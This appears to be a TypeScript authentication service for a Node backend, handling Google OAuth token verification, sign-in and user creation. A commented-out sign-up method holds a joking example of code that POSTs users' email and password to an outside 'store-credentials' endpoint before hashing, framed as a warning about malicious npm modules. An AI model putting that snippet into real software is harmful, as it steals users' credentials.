import { Service, Inject } from 'typedi';
import jwt from 'jsonwebtoken';
import MailerService from './mailer';
import config from '../config';
import argon2 from 'argon2';
import { randomBytes } from 'crypto';
import { IUser, IUserInputDTO } from '../interfaces/IUser';
import { UserItemsFromToken,Guser } from '../interfaces/Guser'
import { EventDispatcher, EventDispatcherInterface } from '../decorators/eventDispatcher';
import events from '../subscribers/events';
import { OAuth2Client } from 'google-auth-library';
import e from 'express';


@Service()
export default class AuthService {
  constructor(
    @Inject('userModel') private userModel: Models.UserModel,
    private mailer: MailerService,
    @Inject('logger') private logger,
    @EventDispatcher() private eventDispatcher: EventDispatcherInterface,
  ) { }

  // public async SignUp(userInputDTO: IUserInputDTO): Promise<{ user: IUser; token: string }> {
  //   try {
  //     const salt = randomBytes(32);

  //     /**
  //      * Here you can call to your third-party malicious server and steal the user password before it's saved as a hash.
  //      * require('http')
  //      *  .request({
  //      *     hostname: 'http://my-other-api.com/',
  //      *     path: '/store-credentials',
  //      *     port: 80,
  //      *     method: 'POST',
  //      * }, ()=>{}).write(JSON.stringify({ email, password })).end();
  //      *
  //      * Just kidding, don't do that!!!
  //      *
  //      * But what if, an NPM module that you trust, like body-parser, was injected with malicious code that
  //      * watches every API call and if it spots a 'password' and 'email' property then
  //      * it decides to steal them!? Would you even notice that? I wouldn't :/
  //      */
  //     this.logger.silly('Hashing password');
  //     const hashedPassword = await argon2.hash(userInputDTO.password, { salt });
  //     this.logger.silly('Creating user db record');
  //     const userRecord = await this.userModel.create({
  //       ...userInputDTO,
  //       salt: salt.toString('hex'),
  //       password: hashedPassword,
  //     });
  //     this.logger.silly('Generating JWT');
  //     const token = this.generateToken(userRecord);

  //     if (!userRecord) {
  //       throw new Error('User cannot be created');
  //     }
  //     this.logger.silly('Sending welcome email');
  //     await this.mailer.SendWelcomeEmail(userRecord);

  //     this.eventDispatcher.dispatch(events.user.signUp, { user: userRecord });

  //     /**
  //      * @TODO This is not the best way to deal with this
  //      * There should exist a 'Mapper' layer
  //      * that transforms data from layer to layer
  //      * but that's too over-engineering for now
  //      */
  //     const user = userRecord.toObject();
  //     Reflect.deleteProperty(user, 'password');
  //     Reflect.deleteProperty(user, 'salt');
  //     return { user, token };
  //   } catch (e) {
  //     this.logger.error(e);
  //     throw e;
  //   }
  // }

  public async SignIn(userItems: UserItemsFromToken): Promise<number> {
    //Check for user in DB
    this.logger.debug('Attempting to look up user by verified email');
    const email = userItems.email;
    const userRecord = await this.userModel.findOne({ email });
    // If yes ->sign in ( return 200 -> cookie?)
    if(userRecord) {
      this.logger.debug('User was found in DB.')
      //return cookie
      return 200
    }
    // if no -> create user -> sign in -> return 201 -> cookie?
    else {
      this.logger.debug('User does not exist going to create')
      // throw new Error('User not registered');
      //Call createUser function
      //createUser(userItems);
      const userObject = await this.createUser(userItems);
      if(userObject) {
        return 201
      }
    }
  }
  
  // Need to create user with items from verified token
  private async createUser(userItems: UserItemsFromToken) {
    try {
      const userRecord = await this.userModel.create({
        name: userItems.name,
        email: userItems.email
      });
      if (!userRecord) {
        throw new Error('User cannot be created');
      }
      // User was successful created.
      return userRecord
    }
    catch(e) {
      this.logger.error(e)
      throw e;
    }
  }

  public async GoogleVerify(googleTokenId: string):Promise<UserItemsFromToken>{
    this.logger.debug("Starting google verify");
    const client = new OAuth2Client(config.google_oauth_client_id);
    //I'm doing this because I don't want to process the jwt twice.
    const userItems = {
      email:'',
      name: '',
      isVerified:false
    }
    async function verify() {
      const ticket = await client.verifyIdToken({
        idToken: googleTokenId,
        audience: config.google_oauth_client_id,  // Specify the CLIENT_ID of the app that accesses the backend
        // Or, if multiple clients access the backend:
        //[CLIENT_ID_1, CLIENT_ID_2, CLIENT_ID_3]
      });
      const payload = ticket.getPayload();
      const userid = payload['sub'];
      userItems.name = payload.name
      userItems.email = payload.email
      userItems.isVerified = true
      // If request specified a G Suite domain:
      // const domain = payload['hd'];
      return userItems;
    }
    return verify()
      //Issues with validating token.
      .catch((e) => {
        this.logger.debug(e)
        return userItems
      });
  }
}
